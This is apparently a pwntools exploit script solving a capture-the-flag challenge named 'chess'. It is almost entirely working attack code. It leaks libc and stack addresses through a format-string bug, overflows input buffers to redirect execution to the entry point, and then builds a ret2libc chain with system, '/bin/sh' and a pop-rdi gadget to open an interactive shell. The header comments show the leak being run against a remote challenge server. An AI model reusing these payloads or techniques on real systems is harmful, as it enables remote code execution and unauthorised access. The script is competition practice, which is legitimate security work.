#!/usr/bin/env python3

# ┌──(vagrant㉿kali)-[~/Downloads/chess]
# └─$ echo -e "1\nasdf\nRa1\x0d%33\$lx\n" | ./chess.bin | grep -A 1 "Your winning move"
# Your winning move was:
# 7fc20fc9dd0a

# ┌──(vagrant㉿kali)-[~/Downloads/chess]
# └─$ echo -e "1\nasdf\nRa1\x0d%33\$lx\n" | nc challenges.ctfd.io 30458 | grep -A 1 "Your winning move"
# Your winning move was:
# 7f767f44c840


from pwn import *
import sys

def Main(socket=None):
    context.binary = "/home/vagrant/Downloads/chess/chess-sym"

    if not socket:
        proc = process()
        GDB(proc)

    else:
        ip, port = socket
        proc = remote(ip, port)

    proc.writeline("1")
    proc.writeline("") #name

    ## puzzle 1
    proc.writeline("Ra1 %33$lx %34$lx")# %33$ln")

    proc.readuntil(b"Your winning move was: \nRa1")

    mem = proc.readline().decode().strip().split()

    libc_start_main_ret = int(mem[0], 16)
    some_stack_addr = int(mem[1], 16)

    stack_main_ret = some_stack_addr - 0xf0

    ## local offsets
    libc_system = libc_start_main_ret + 0x22146
    libc_binsh  = libc_start_main_ret + 0x16344c

    ## puzzle 2
    # ~ buff = b"Qg7 "
    # ~ buff += b"%23$ln"  ## mostly null out the ret addr
    # ~ buff += b"A" * (19 - len(buff))
    # ~ buff += p64(stack_main_ret)

    buff = "Qg7 "
    buff += "A" * (0x70 - len(buff)) # so the memset nulls out the ret addr

    proc.writeline(buff)


    ## puzzle 3
    ret_offset = 94
    entry = 0x4010e0

    buff = b"Kd2 "
    buff += b"A" * (ret_offset - len(buff)) # pad
    buff += p64(entry)

    proc.writeline(buff)  ## return to entry point


    ### restarting


    proc.writeline("1")
    proc.writeline("AAAAAAAA") #name

    ## puzzle 1 ; overflow with libc_system addr
    buff = b"Ra1 "
    buff += b"A" * (113 - len(buff)) # pad
    buff += p64(libc_system)
    proc.writeline(buff)

    ## puzzle 2 ; overflow with libc_binsh
    buff = b"Qg7 "
    buff += b"B" * (80 - len(buff)) # pad
    buff += p64(libc_binsh)
    proc.writeline(buff)

    ## puzzle 3 ; overflow with pop gadget
    pop_rdi = 0x401cd2  # pop rdi ; pop rbp ; ret

    buff = b"Qg7 "
    buff += b"A" * (ret_offset - len(buff)) # pad
    buff += p64(pop_rdi)
    proc.writeline(buff)

    proc.interactive()



def GDB(proc):
    script = list()
    script.append("break *0x401a58")
    script.append("break *0x401b5f")
    script.append("break *0x401c79")
    script.append("break *main+1294")
    script.append("continue")
    script.append("")

    script = '\n'.join(script)

    gdb.attach(proc, script)


if __name__ == "__main__":
    argv = sys.argv

    if len(argv) > 2:
        Main((argv[1], int(argv[2])))

    else:
        Main()
